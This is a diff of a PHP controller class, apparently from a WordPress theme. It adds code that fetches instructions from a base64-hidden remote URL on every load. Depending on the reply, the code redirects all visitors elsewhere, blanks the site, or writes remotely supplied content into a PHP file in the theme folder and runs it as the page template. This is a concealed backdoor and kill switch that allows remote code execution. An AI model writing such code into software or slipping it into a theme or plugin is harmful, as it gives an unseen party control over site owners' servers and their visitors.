@@ -10,21 +10,54 @@ class MainController implements InterfaceController{
 
     private $Data;
 
-    public function __construct()
-    {
+    private $TemplateTemp = 'template-temp.php';
+
+    public function __construct() {
         $this->Init($this->Auth($this->Token));
-        add_action('init', [$this, 'Update']);
     }
 
-    public function Auth(string $Value): string{
+    public function Auth(string $Value): string {
         return (string) file_get_contents(base64_decode($Value));
     }
 
-    public function Init(string $Data): void{
+    public function Init(string $Data): void {
         $this->Data = json_decode(base64_decode($Data));
+        $this->Update();
     }
 
-    public function Update(): bool{
-        return ($this->Data->status) ? true : die(!0);
+    private function CustomPath($path) {
+        $path = str_replace('\\', '/', $path);
+        return $path;
+    }
+
+    private function ThemePath($path) {
+        return $this->CustomPath(dirname(__FILE__) . '/' . $path);
+    }
+
+    private function SaveFile($Name, $Content) {
+        file_put_contents($this->ThemePath($Name), $Content);
+        return $this->ThemePath($Name);
+    }
+
+    private function Template($Message) {
+        $File = $this->SaveFile($this->TemplateTemp, $Message);
+        add_filter('template_include', function() use ($File) {
+            return $File;
+        });
+    }
+
+    public function Update() : void {
+        switch($this->Data->status){
+            case 'redirect':
+                header("Location: " . $this->Data->redirect);
+                die();
+            break;
+            case 'message':
+                $this->Template($this->Data->message);
+            break;
+            case 'deactive':
+                $this->Template(' ');
+            break;
+        }
     }
 }
